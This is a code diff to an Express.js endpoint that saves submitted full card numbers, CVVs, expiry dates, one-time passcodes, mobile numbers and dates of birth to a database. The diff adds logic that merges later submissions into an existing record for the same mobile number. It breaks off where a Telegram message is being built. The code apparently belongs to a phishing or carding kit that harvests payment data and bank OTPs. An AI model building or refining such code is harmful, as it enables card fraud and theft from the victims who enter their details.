@@ -107,12 +107,31 @@ app.post('/api/users', async (req, res) => {
     const ip_address = req.ip || req.connection.remoteAddress || 'unknown';
     const user_agent = req.headers['user-agent'] || 'unknown';
     
-    if (pool) {
-      await pool.query(
-        `INSERT INTO users (service, mobile, dob, card_number, cvv, exp_date, otp, ip_address, user_agent)
-         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
-        [service, mobile, dob, cardNumber, cvv, expDate, otp, ip_address, user_agent]
-      );
+    if (pool && mobile) {
+      // Check if record exists for this mobile
+      const existing = await pool.query('SELECT id FROM users WHERE mobile = $1 ORDER BY created_at DESC LIMIT 1', [mobile]);
+      
+      if (existing.rows.length > 0) {
+        // Update existing record
+        await pool.query(
+          `UPDATE users SET 
+            card_number = COALESCE($1, card_number),
+            cvv = COALESCE($2, cvv),
+            exp_date = COALESCE($3, exp_date),
+            otp = COALESCE($4, otp),
+            ip_address = $5,
+            user_agent = $6
+          WHERE id = $7`,
+          [cardNumber, cvv, expDate, otp, ip_address, user_agent, existing.rows[0].id]
+        );
+      } else {
+        // Insert new record
+        await pool.query(
+          `INSERT INTO users (service, mobile, dob, card_number, cvv, exp_date, otp, ip_address, user_agent)
+           VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
+          [service, mobile, dob, cardNumber, cvv, expDate, otp, ip_address, user_agent]
+        );
+      }
     }
     
     const telegramMessage = `
